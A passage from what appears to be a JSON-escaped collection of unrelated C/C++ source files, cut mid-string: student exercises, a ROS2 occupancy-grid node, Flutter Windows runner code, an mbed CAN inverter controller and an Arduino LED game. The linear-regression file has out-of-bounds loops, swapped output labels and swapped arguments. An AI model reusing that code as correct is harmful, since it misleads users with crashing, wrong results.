\u0444\u0443\u043d\u043a\u0446\u0438\u0438).\n//\u0412\u044b\u0432\u0435\u0441\u0442\u0438 \u043d\u0430 \u043f\u0435\u0447\u0430\u0442\u044c \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u0432\u0441\u0435\u0445 \u0432\u043a\u043b\u0430\u0434\u043e\u0432 \u0438 \u0441\u0443\u043c\u043c\u0430\u0440\u043d\u0443\u044e \u0441\u0443\u043c\u043c\u0443 \u043d\u0430 \u0441\u0447\u0435\u0442\u0430\u0445 \u0447\u0435\u0440\u0435\u0437 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e \u043b\u0435\u0442,\n//\u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0432\u0432\u043e\u0434\u0438\u0442\u0441\u044f \u0441 \u043a\u043b\u0430\u0432\u0438\u0430\u0442\u0443\u0440\u044b.\n\n#include <iostream>\n#include <cmath>\n#include <vector>\nusing namespace std;\n\nclass BankDep {\n    string FIO;\n    double capital;\n    int percent;\npublic:\n    BankDep (string  n, double c, int p): FIO(std::move(n)), capital(c), percent(p) {}\n    void print() {\n        cout << \"\\nFIO: \" << FIO << \"\\nCapital: \" << capital << \"\\nPercent: \" << percent;\n    }\n    double calcFunc(int y) {\n        return capital*pow(1+double(percent)/100, y);\n    }\n};\n\n\n\nint main() {\n    vector<BankDep> mas = {\n            BankDep(\"Ivanov V.V.\", 60000, 14),\n            BankDep(\"Nikita E.R\", 44000, 23),\n            BankDep(\"Anton D.A.\", 36000, 20),\n    };\n    int y;\n    for (BankDep i: mas) {\n        i.print();\n        cout << \"\\n\";\n        cin >> y;\n        cout << \"\\nCapital before \" << y << \" years: \" << i.calcFunc(y);\n    }\n    return 0;\n}\n",
    "#include \"rclcpp/rclcpp.hpp\"\n#include \"sensor_msgs/msg/point_cloud2.hpp\"\n#include \"nav_msgs/msg/occupancy_grid.hpp\"\n#include \"pcl_conversions/pcl_conversions.h\"\n#include \"pcl/point_cloud.h\"\n#include \"pcl/point_types.h\"\n#include <pcl/filters/voxel_grid.h>\n#include <vector>\n#include <iostream>\n\nclass OccupancyGridMapGenerator : public rclcpp::Node\n{\npublic:\n    OccupancyGridMapGenerator() : Node(\"occupancy_grid_map_generator\")\n    {   \n\n        // Declare parameters with default values\n        declare_parameters();\n\n        // Get parameter values\n        get_parameters();\n\n        auto qos = rclcpp::QoS(rclcpp::KeepLast(1)).reliable(); // \uc13c\uc11c \ub370\uc774\ud130\uc5d0 \ub300\ud55c \uc2e0\ub8b0\ud560 \uc218 \uc788\ub294 QoS \uc124\uc815\n\n        subscription_ = this->create_subscription<sensor_msgs::msg::PointCloud2>(\n            \"/filtered_points\", qos,\n            std::bind(&OccupancyGridMapGenerator::pointcloud_callback, this, std::placeholders::_1));\n\n        publisher_ = this->create_publisher<nav_msgs::msg::OccupancyGrid>(\"occupancy_grid_topic\", 10);\n    }\n\nprivate:\n\n    float min_x_; // Minimum x coordinate of the point cloud\n    float max_x_; // Maximum x coordinate of the point cloud\n    float min_y_; // Minimum y coordinate of the point cloud\n    float max_y_; // Maximum y coordinate of the point cloud\n    float grid_size_; // Grid size in meters\n    float origin_orientation_x;\n    float origin_orientation_y;\n    float origin_orientation_z;\n    float origin_orientation_w;\n    float safety_radius_;   // \uc804\uc5ed \ubcc0\uc218\ub85c safety_radius \uc124\uc815\n\n    float boat_position_x_; // \ubcf4\ud2b8\uc758 x \uc88c\ud45c\n    float boat_position_y_; // \ubcf4\ud2b8\uc758 y \uc88c\ud45c\n    float boat_radius_;     // \ubcf4\ud2b8 \uc548\uc804 \ubc18\uacbd\n    float boat_width_;     // \ubcf4\ud2b8 \uc548\uc804 \ubc18\uacbd\n    float boat_height_;     // \ubcf4\ud2b8 \uc548\uc804 \ubc18\uacbd\n\n    void declare_parameters()\n    {   \n        declare_parameter<float>(\"min_x_\", 0.0);\n        declare_parameter<float>(\"max_x_\", 10.0);\n        declare_parameter<float>(\"min_y_\", 0.0);\n        declare_parameter<float>(\"max_y_\", 10.0);\n        declare_parameter<float>(\"grid_size_\", 0.1);\n        declare_parameter<float>(\"origin_orientation_x\", 0.0);\n        declare_parameter<float>(\"origin_orientation_y\", 0.0);\n        declare_parameter<float>(\"origin_orientation_z\", 0.0);\n        declare_parameter<float>(\"origin_orientation_w\", 1.0);\n        declare_parameter<float>(\"safety_radius_\", 0.7);\n        declare_parameter<float>(\"boat_position_x_\", 0.0);\n        declare_parameter<float>(\"boat_position_y_\", 0.0);\n        declare_parameter<float>(\"boat_radius_\", 0.8);\n        declare_parameter<float>(\"boat_width_\", 0.8);\n        declare_parameter<float>(\"boat_height_\", 2.0);\n\n    }\n\n    void get_parameters()\n    {   \n        get_parameter(\"min_x_\", min_x_);\n        get_parameter(\"max_x_\", max_x_);\n        get_parameter(\"min_y_\", min_y_);\n        get_parameter(\"max_y_\", max_y_);\n        get_parameter(\"grid_size_\", grid_size_);\n\n        get_parameter(\"origin_orientation_x\", origin_orientation_x);\n        get_parameter(\"origin_orientation_y\", origin_orientation_y);\n        get_parameter(\"origin_orientation_z\", origin_orientation_z);\n        get_parameter(\"origin_orientation_w\", origin_orientation_w);\n        get_parameter(\"safety_radius_\", safety_radius_);\n        get_parameter(\"boat_position_x_\", boat_position_x_);\n        get_parameter(\"boat_position_y_\", boat_position_y_);\n        get_parameter(\"boat_radius_\", boat_radius_);\n        get_parameter(\"boat_width_\", boat_width_);\n        get_parameter(\"boat_height_\", boat_height_);\n    }\n\n    void pointcloud_callback(const sensor_msgs::msg::PointCloud2::SharedPtr msg)\n    {\n        pcl::PCLPointCloud2 pcl_cloud;\n        pcl_conversions::toPCL(*msg, pcl_cloud);\n        pcl::PointCloud<pcl::PointXYZ>::Ptr pcl_cloud_xyz(new pcl::PointCloud<pcl::PointXYZ>);\n        pcl::fromPCLPointCloud2(pcl_cloud, *pcl_cloud_xyz);\n\n        // Voxel grid downsampling (optional, for efficiency)\n        pcl::VoxelGrid<pcl::PointXYZ> vg;\n        vg.setInputCloud(pcl_cloud_xyz);\n        vg.setLeafSize(0.5, 0.5, 0.5); // Adjust the leaf size according to your preference\n        pcl::PointCloud<pcl::PointXYZ>::Ptr pcl_cloud_downsampled(new pcl::PointCloud<pcl::PointXYZ>);\n        vg.filter(*pcl_cloud_downsampled);\n    \n        // Convert PointCloud to OccupancyGrid\n        nav_msgs::msg::OccupancyGrid occupancy_grid;\n        \n        // Assuming grid parameters\n        float min_x = min_x_; // Minimum x coordinate of the point cloud\n        float max_x = max_x_; // Maximum x coordinate of the point cloud\n        float min_y = min_y_; // Minimum y coordinate of the point cloud\n        float max_y = max_y_; // Maximum y coordinate of the point cloud\n        float grid_size = grid_size_; // Grid size in meters\n        // int grid_width = static_cast<int>((max_x - min_x) / grid_size) + 1; // Number of grid cells along x-axis\n        // int grid_height = static_cast<int>((max_y - min_y) / grid_size) + 1; // Number of grid cells along y-axis\n        int grid_width = static_cast<int>((max_x - min_x) / grid_size) + 1;\n        int grid_height = st",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nint cpt = 1;\n\nclass Document\n{\nprivate:\n    int id;\n    float prix;\n    string titre;\n    int code;\n\npublic:\n    Document(float prix, string titre, int code)\n    {\n        id = cpt;\n        cpt++;\n        this->prix = prix;\n        this->titre = titre;\n        this->code = code;\n    }\n\n    int getCode() { return code; }\n    float getPrix() { return prix; }\n\n    void afficher()\n    {\n        cout << id;\n    }\n\n    void reduirePrix(float pourcentage)\n    {\n        this->prix = prix - prix * pourcentage;\n    }\n\n    void operator==(Document &obj)\n    {\n        if (obj.getCode() == code)\n        {\n            cout << obj.getCode() << \" Et \" << code << \" sont egaux !!\" << endl;\n        }\n        else\n        {\n            cout << obj.getCode() << \" Et \" << code << \" sont pas egaux !!\" << endl;\n        }\n    }\n\n    void operator<(Document &obj)\n    {\n        if (obj.getPrix() == prix)\n        {\n            cout << \"Prix inferieur \" << endl;\n        }\n        else\n        {\n            cout << \"Prix Superieur \" << endl;\n        }\n    }\n\n    friend ostream &operator<<(ostream &out, const Document &obj);\n};\n\nostream &operator<<(ostream &out, const Document &obj)\n{\n    out << \"ID : \" << obj.id << \" ; Titre : \" << obj.titre << \" ; Code : \" << obj.code << endl;\n    return out;\n}\n\nint main()\n{\n\n    Document D1(20.00, \"Doc1\", 0000);\n    Document D2(20.00, \"Doc1\", 0001);\n\n    D1.afficher();\n    D2.afficher();\n\n    D1 == D2;\n    cout << D2;\n\n    return 0;\n}",
    "#include \"mbed.h\"\n#include \"CAN.h\"\n\n#define INVERSOR_TX_ID 0x100\n#define INVERSOR_RX_ID 0x101\n\n#define INVERSOR_TX_ID_2 0x200\n#define INVERSOR_RX_ID_2 0x201\n\n#define MAXRPM 8000\n#define MAXPWM 65535\n#define MAX_CAN_DATA_SIZE 8\n\n#define N_LEITURAS 10\n#define SENSOR_MIN_OFFSET_5V 6650  // Para 5 volts utilizando uma fonte debancada\n#define SENSOR_MAX_OFFSET_5V 65535\n#define SENSOR_MAX_OFFSET_5V_87 58500\n\n// Defines para Diferencial\n#include \"math.h\"\n#define PI 3.14159265359\n#define BLOQUEIO_DIRECAO 20\n#define ANGULO_VOLANTE 160/2 // 160\u00b0 -> 80\u00b0Esquerda e 80\u00b0 Direita\n// Calculo M\u00e9dias -------\nint leituras[N_LEITURAS];\nint index_leituras;\nint total;\n// ---------------------\n\nAnalogIn sensor_acelerador(PA_3);\nAnalogIn sensor_volante(PA_5);\nint sensor_apps();\n//CAN\n\nCAN can1(PA_11, PA_12, 1000000);\nbool is_can_active();\nvoid reset_can();\nbool baud_test();\n//Fun\u00e7\u00e3o para enviar as mensagem CAN para o inversor\nvoid send_to_inverter();\nvoid send_to_inverter_2();\n// Fun\u00e7\u00e3o para receber dados do inversor\nvoid receive_from_inverter();\nvoid receive_from_inverter_2();\n// Fun\u00e7\u00e3o para imprimir os resultados da CAN;\nvoid showParameters();\n// Fim de CAN\n\n//Diferencial\nfloat getDelta();\nfloat getAngle();\nvoid Diferencial();\n\nvoid CalibrarADC();\n// Vari\u00e1veis Sensor do Volante + Diferencial\nfloat tensao_sensor;\nfloat angulo_sensor, angulo_volante;\nfloat delta, delta_aux;\nfloat A = 1.525;\nfloat d = 1;\nfloat w_ref = 50;\nfloat tan_delta;\nfloat dif_w;\nfloat w_out, w_in;\n\n\n// Vari\u00e1veis do TX \n\nchar counter = 0;\nuint16_t rpm = 9000;\nuint16_t pwm = 0; \nfloat pwm_percent = 0.0;\nfloat pwm_aux = 0.0;\nuint16_t corrente = 39;\n\nchar counter2 = 0;\nuint16_t rpm2 = 9000;\nuint16_t pwm2 = 0;\nfloat pwm_percent2 = 0.0;\nfloat pwm_aux2 = 0.0;\nuint16_t corrente2 = 39;\n\n\n\n// Vari\u00e1veis de STATUS - RX\nfloat rx_pwm_percent = 0.0, rx_pwm_percent2 =0.0;\nuint16_t rx_rpm, rx_rpm2;\nuint16_t rpm_aux, rpm_aux2;\nuint8_t rpm_high,rpm_high2;\nuint8_t rpm_low,rpm_low2;\nuint8_t tensao_high,tensao_high2;\nuint16_t tensao_aux,tensao_aux2;\nuint16_t tensao, tensao2;\nuint8_t contador, contador2;\nuint8_t temp_controlador,temp_controlador2;\nuint8_t temp_motor,temp_motor2;\nuint8_t rx_pwm,rx_pwm2;\nuint8_t rx_corrente,rx_corrente2;\nfloat tensao_float,tensao_float2;\n\n\n\n// main() runs in its own thread in the OS\n\n\n\nint main()\n{\n    can1.mode(CAN::Normal);\n    can1.filter(0, 0, CANStandard);\n    CalibrarADC();\n\n    sensor_acelerador.set_reference_voltage(3.31);\n    sensor_volante.set_reference_voltage(3.31);\n\n    while (true) \n\n    {\n\n        Diferencial();\n        send_to_inverter(); // Chamamento da fun\u00e7\u00e3o pra enviar ao inversor 1\n        send_to_inverter_2(); // Chamamento da fun\u00e7\u00e3o para enviar ao inversor 2;\n        printf(\"PWM 1: %d PWM 2: %d\\n\",pwm,pwm2);\n        \n        receive_from_inverter(); // Chamento da Fun\u00e7\u00e3o para receber do Inversor;\n        receive_from_inverter_2();// Chamamento da Fun\u00e7\u00e3o para receber do Inversor;\n        showParameters(); // Fun\u00e7\u00e3o para imprimir os par\u00e2metros recebidos do Inversor;\n        wait_us(1e5); // aguarda 100ms;\n    }\n}\n//end of main\n\n\n\n\nvoid receive_from_inverter() {\n    //Definir mensagem CAN a ser recebida\n    CANMessage inverter_rx_msg;\n    inverter_rx_msg.len = 8;\n\n\nif(is_can_active()) {\n\n    if(can1.read(inverter_rx_msg)){\n    // Aguardar a recep\u00e7\u00e3o da mensagem do inversor\n\n         if(inverter_rx_msg.id == INVERSOR_RX_ID){\n         contador = inverter_rx_msg.data[0] & 0xF;\n         tensao_high = inverter_rx_msg.data[0] >> 4;\n         tensao_aux = tensao_high << 8;\n         tensao = tensao_aux | inverter_rx_msg.data[1];\n         temp_controlador = inverter_rx_msg.data[2]-100; // Varia de 0-255, de -100\u00baC \u00e0 155\u00baC\n         temp_motor = inverter_rx_msg.data[3]-100;// Varia de 0-255, de -100\u00baC \u00e0 155\u00baC\n         rpm_low = inverter_rx_msg.data[4]; //\n         rpm_high = inverter_rx_msg.data[5];\n         rx_pwm = inverter_rx_msg.data[6]; // Varia de 0-255, 0 a 100%\n         rx_corrente = inverter_rx_msg.data[7];\n         rpm_aux = rpm_high << 8;\n         rx_rpm = rpm_low | rpm_aux; \n         tensao_float = tensao/10.0f;\n         rx_pwm_percent = (rx_pwm/255.0f)*100;\n         }\n    }\n } else {\n            printf(\"Conex\u00e3o CAN inativa. Tentando reinicializar...\\n\");\n            reset_can(); \n        }\n   }\n    \n   void receive_from_inverter_2() {\n    //Definir mensagem CAN a ser recebida\n    CANMessage inverter_rx_msg2;\n    inverter_rx_msg2.len = 8;\n\n\nif(is_can_active()) {\n\n    if(can1.read(inverter_rx_msg2)){\n    // Aguardar a recep\u00e7\u00e3o da mensagem do inversor\n\n         if(inverter_rx_msg2.id == INVERSOR_RX_ID_2){\n         contador2 = inverter_rx_msg2.data[0] & 0xF;\n         tensao_high2 = inverter_rx_msg2.data[0] >> 4; \n         tensao_aux2 = tensao_high2 << 8; //                  0000101000000000;\n         tensao2 = tensao_aux2 | inverter_rx_msg2.data[1];//+ 0000000010100010 = 0000101010100010;\n         temp_controlador2 = inverter_rx_msg2.data[2]-100; // Varia de 0-255, de -100\u00baC \u00e0 155\u00baC\n         temp_motor2 = inverter_rx_msg2.data[3]-100;",
    "/*######################################################################\n  //#  G0B1T: uC EXAMPLES. 2024.\n  //######################################################################\n  //# Copyright (C) 2024. F.E.Segura-Quijano (FES) fsegura@uniandes.edu.co\n  //#\n  //# This program is free software: you can redistribute it and/or modify\n  //# it under the terms of the GNU General Public License as published by\n  //# the Free Software Foundation, version 3 of the License.\n  //#\n  //# This program is distributed in the hope that it will be useful,\n  //# but WITHOUT ANY WARRANTY; without even the implied warranty of\n  //# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n  //# GNU General Public License for more details.\n  //#\n  //# You should have received a copy of the GNU General Public License\n  //# along with this program.  If not, see <http://www.gnu.org/licenses/>\n  //####################################################################*/\n\n//=======================================================\n//  LIBRARY Definition\n//=======================================================\n#include <Arduino.h>\n\n#define REALMATRIX // Variable to use real matrix. Comment to not use it.\n\n#ifdef REALMATRIX\n#include \"LedControl.h\"\n/* Pin definition for MAX72XX.\n ARDUINO pin 12 is connected to the DataIn  - In ESP32 pin 23\n ARDUINO pin 11 is connected to the CLK     - In ESP32 pin 18\n ARDUINO pin 10 is connected to LOAD        - In ES32 pin 5\n We have only a single MAX72XX.\n */\nLedControl lc=LedControl(23,18,5,1);\n#endif\n\n//=======================================================\n//  IF PROBLEMS\n//=======================================================\n// In LedControl.h  change the following line:\n// #include <avr/pgmspace.h>\n// by \n/* #if (defined(__AVR__))\n #include <avr\\pgmspace.h>\n #else\n #include <pgmspace.h>\n #endif\n*/\n\n//=======================================================\n//  REGISTERS (VARIABLES) to control the game\n//=======================================================\n/* Registers to background cars.*/\nbyte RegBACKGTYPE_dataRANDOM;\nbyte RegBACKGTYPE_dataZEROS = B00000000;\n\n/* Time delays. */\nunsigned long delaytime = 2000;\n\n/* Global Variables */\nint i = 0;\n\n/* States ans signals to change state*/\nenum State_enum {STATERESET, STATESTART, STATECLEAR, STATECHECK, STATELEFT, STATERIGTH, STATELOST};\nuint8_t state = STATERESET;\n\nenum Keys_enum {RESET_KEY, START_KEY, LEFT_KEY, RIGHT_KEY, NO_KEY};\nuint8_t keys = RESET_KEY;\n\nenum Status_enum {LOST, CONTINUE};\nuint8_t Status = CONTINUE;\n\n/* Key to control game by serial input. */\n  int incomingByte;\n\n/* Pointer and Matrix to Control Driver. */\n  byte RegMatrix[8];\n  byte *pointerRegMatrix;\n\n/* Pointer and Register to control bottom car. */\n  byte RegCar[1];\n  byte *pointerRegCar;\n\n/* Pointer and Register (Variable) to move bottom car */\n  byte ShiftDir[1];\n  byte *pointerShiftDir;\n\n//=======================================================\n//  SETUP Arduino function\n//=======================================================\n/* Setup function initialization */\nvoid setup()\n{\n#ifdef REALMATRIX\n  /* The MAX72XX is in power-saving mode on startup, we have to do a wakeup call. */\n  lc.shutdown(0, false);\n  /* Set the brightness to a medium values. */\n  lc.setIntensity(0, 8);\n  /* Clear the display. */\n  lc.clearDisplay(0);\n#endif\n  /* Serial port initialization. */\n  Serial.begin(9600);\n\n  /* Pointer to use Matrix between functions. */\n  pointerRegMatrix = &RegMatrix[0];\n\n  /* Pointer to use VectorCar between functions. */\n  pointerRegCar = &RegCar[0];\n\n  /* Pointer to use shift dir between functions */\n  pointerShiftDir = &ShiftDir[0];\n}\n\n//=======================================================\n//  FUNCTION: writeResetMatrix\n//=======================================================\n/* Data matrix when reset*/\nvoid writeResetMatrix(byte *pointerRegMatrix, byte *pointerRegCar)\n{\n  /* Global variables. */\n\n  /* Here is the data to reset matrix */\n  pointerRegMatrix[7] = B11111111;\n  pointerRegMatrix[6] = B11111111;\n  pointerRegMatrix[5] = B11111111;\n  pointerRegMatrix[4] = B11111111;\n  pointerRegMatrix[3] = B11111111;\n  pointerRegMatrix[2] = B11111111;\n  pointerRegMatrix[1] = B11111111;\n  pointerRegMatrix[0] = B11111111;\n  /* Here is the data to reset bottomCar */\n  pointerRegCar[0] = B00000000;\n}\n//=======================================================\n//  FUNCTION: writeStartMatrix\n//=======================================================\nvoid writeStartMatrix(byte *pointerRegMatrix, byte *pointerRegCar)\n{\n  /* Global variables. */\n\n  /* Here is the data to start matrix */\n  pointerRegMatrix[7] = B01111110;\n  pointerRegMatrix[6] = B10000001;\n  pointerRegMatrix[5] = B10011001;\n  pointerRegMatrix[4] = B10000001;\n  pointerRegMatrix[3] = B10100101;\n  pointerRegMatrix[2] = B10011001;\n  pointerRegMatrix[1] = B10000001;\n  pointerRegMatrix[0] = B01111110;\n/* Here is the data to start bottomCar */\n  pointerRegCar[0] = B00000000;\n}\n//=====================================",
    "\n// Includes necessary libraries\n#include <vector>\n#include <iostream>\n#include <cmath>\nusing namespace std;\n\n// Function to input data points into two vectors\nvoid inputData(vector<int>& x, vector<int>& y) {\n    int size;\n  \n    // Asking for the number of data points to be inputted\n    cout << \"Enter the number of data points you want to input: \";\n    cin >> size;\n\n    cout << \"Please enter values for x and y:\" << endl;\n    for(int i=0; i<size; i++) {\n        int value;\n        // Input x values\n        cout << \"x[\"<<i<<\"]: \";\n        cin >> value;\n        x.push_back(value);\n        \n        // Input y values\n        cout << \"y[\"<<i<<\"]: \";\n        cin >> value;\n        y.push_back(value);\n    }\n}\n\n// Function to calculate R-squared (R2), a statistical measure \nfloat R2(float w_opt,float b_opt, const vector<int>& x, const vector<int>& y, float y_mean)\n{\n    float fi;\n    float ssRES = 0;   // Residual sum of squares\n    float ssTOT = 0;   // Total sum of squares\n    float R2;\n\n    // Calculation of residual sum of squares\n    for (int i = 0; i <= x.size(); i++)\n    {\n        fi = w_opt * x[i] + b_opt;\n        ssRES += (y[i] - fi)*(y[i] - fi);\n\n    }\n\n    // Calculation of total sum of squares\n    for (int i = 0; i < x.size(); i++)\n    {\n        ssTOT += (y[i] - y_mean)*(y[i] - y_mean);\n    }\n    \n    // Calculation of R-squared (R2)\n    R2 = 1 - (ssRES/ssTOT);\n    return(R2);\n}\n\n// Function to calculate variance\nfloat varianceX(const vector<int>& x, float x_mean)\n{\n    float sum2 = 0, var = 0;\n    // calculating the variance\n    for (int i = 0; i < x.size(); i++)\n    {\n        sum2 = pow((x[i] - x_mean), 2); \n        var += sum2;\n    }\n    return(var / x.size());\n}\n\n// Function to calculate covariance\nfloat covariance(const vector<int>& x, const vector<int>& y, float x_mean, float y_mean)\n{\n    float mul = 0;\n\n    // Calculating the covariance\n    for (int i = 0; i <= x.size(); i++)\n    {\n        mul = mul + (x[i] - x_mean) * (y[i] - y_mean);\n\n    }\n    return (mul / x.size());\n}\n\n// Function implementing gradient descent optimization algorithm \nvoid gradientDescentAlgorithm(float &w_opt2, float &b_opt2, const vector<int>& x, const vector<int>& y, float learning_rate)\n{\n    float dw, db, num13 = (1 / 13.0);\n    float sum_w = 0, sum_b = 0;\n    float prediction;\n\n    // Updating weights and bias with gradient descent\n    for (int i = 0; i < x.size(); i++)\n    {\n        prediction = (w_opt2 * x[i]) + b_opt2;\n        sum_w += x[i] * (prediction - y[i]);\n        sum_b += prediction - y[i];\n    }\n\n    dw = num13 * sum_w;\n    db = num13 * sum_b;\n    w_opt2 -= learning_rate * dw;  // Updating weight\n    b_opt2 -= learning_rate * db;  // Updating bias\n}\n\n\n// Function to calculate cost function\nfloat cost_function(const vector<int>& x, const vector<int>& y, float w_opt, float b_opt)\n{\n    float sum = 0;\n    float sum1;\n\n    // Calculating cost function\n    for (int i = 0; i <= x.size(); i++)\n    {\n        sum1 = ((w_opt * x[i] + b_opt) - y[i]) * ((w_opt * x[i] + b_opt) - y[i]);\n        sum = sum + sum1;\n    }\n\n    return(sum / (2 * x.size()));\n}\n\nint main()\n{\n    vector<int> x, y;\n   \n    // Input data into vectors x and y\n    inputData(x, y);\n\n    // Initialize means of x and y\n    float x_mean = 0;\n    float y_mean = 0;\n    \n    int dataSize = x.size();\n\n    // Calculate mean of x and y\n    for (int i = 0; i < dataSize; i++)\n    {\n        x_mean = x_mean + x[i];\n        y_mean = y_mean + y[i];\n    }\n    x_mean = x_mean / dataSize;\n    y_mean = y_mean / dataSize;\n\n    // Calculate covariance and variance\n    float cov = covariance(x, y, x_mean, y_mean);\n    float var_x = varianceX(x, x_mean);\n\n    // Print the calculated variance and covariance\n    cout << \"x_mean is: \" << x_mean << endl;\n    cout << \"y_mean is: \" << y_mean << endl;\n    cout << \"Variance is: \" << cov << endl;\n    cout << \"Covariance is: \" << var_x << endl;\n\n    // Calculate optimal weight and bias\n    float w_opt = cov / var_x;\n    float b_opt = y_mean - (w_opt * x_mean);\n\n    cout << \"\\nW optimal is: \" << w_opt << endl;\n    cout << \"B optimal is: \" << b_opt << endl;\n\n    // Calculate sum of predictions\n    float pred_sum = 0;\n    for (int i = 0; i <= dataSize; i++)\n    {\n        float pred = w_opt * x[i] + b_opt;\n        pred_sum += (pred - y[i]) * (pred - y[i]);\n    }\n\n    // Output cost function and R2 value\n    cout << \"Cost function is: \" << cost_function(x, y, b_opt, w_opt) << endl;\n    cout << \"Corresponding R2: \" << R2(w_opt, b_opt, x, y, y_mean) << endl;\n\n    // Input learning rate\n    float learning_rate;\n    cout << \"Please enter the learning rate: \";\n    cin >> learning_rate;\n\n    // Gradient descent optimization loop\n    float w_opt2, b_opt2;\n    int maxItterations;\n    char answer = 'y';\n    while (answer == 'y')\n    {\n        cout << \"\\nenter w for gradient descent algorithm:\";\n        cin >> w_opt2;\n        cout << \"enter b for gradient descent algorithm:\";\n        cin >> b_opt2;\n\n        cout << \"How many iterations: \";\n        c",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, 